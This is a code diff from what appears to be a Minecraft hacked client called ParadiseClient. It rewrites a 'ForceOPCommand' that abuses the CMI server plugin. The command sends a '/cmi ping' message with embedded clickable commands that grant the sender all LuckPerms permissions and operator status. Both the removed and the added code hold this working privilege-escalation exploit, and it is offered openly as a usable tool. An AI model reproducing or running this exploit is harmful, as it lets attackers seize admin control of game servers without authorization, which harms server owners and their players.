@@ -1,32 +1,24 @@
 package tk.milkthedev.paradiseclientfabric.command.impl;
 
+import com.mojang.brigadier.builder.LiteralArgumentBuilder;
+import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
 import net.minecraft.client.MinecraftClient;
-import tk.milkthedev.paradiseclientfabric.Helper;
 import tk.milkthedev.paradiseclientfabric.command.Command;
-import tk.milkthedev.paradiseclientfabric.command.CommandInfo;
-import tk.milkthedev.paradiseclientfabric.command.exception.CommandException;
 
 import java.util.Objects;
 
-@CommandInfo(
-        alias = "forceop",
-        description = "Gives you op thru CMI exploit",
-        usage = "forceop"
-)
-public class ForceOPCommand extends Command
-{
-
-    @Override
-    public boolean execute(String commandAlias, String... args) throws CommandException
-    {
-        Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler()).sendChatCommand("/cmi ping <T>Click here</T><CC>lp user " + MinecraftClient.getInstance().getSession().getUsername() +  " p set * true</CC>");
-        Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler()).sendChatCommand("/cmi ping <T>Click here</T><CC>op" + MinecraftClient.getInstance().getSession().getUsername() +  "</CC>");
-        return true;
+public class ForceOPCommand extends Command {
+    public ForceOPCommand() {
+        super("paradiseforceop", "Gives OP thru CMI console command sender exploit");
     }
 
     @Override
-    public String[] onTabComplete(String commandAlias, String... args)
-    {
-        return new String[0];
+    public LiteralArgumentBuilder<FabricClientCommandSource> build() {
+        return literal(getName())
+                .executes((context -> {
+                    Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler()).sendChatCommand("cmi ping <T>Click here to get luckperms</T><CC>lp user " + MinecraftClient.getInstance().getSession().getUsername() +  " p set * true</CC>");
+                    Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler()).sendChatCommand("cmi ping <T>Click here to get OP</T><CC>op" + MinecraftClient.getInstance().getSession().getUsername() +  "</CC>");
+                    return SINGLE_SUCCESS;
+                }));
     }
 }
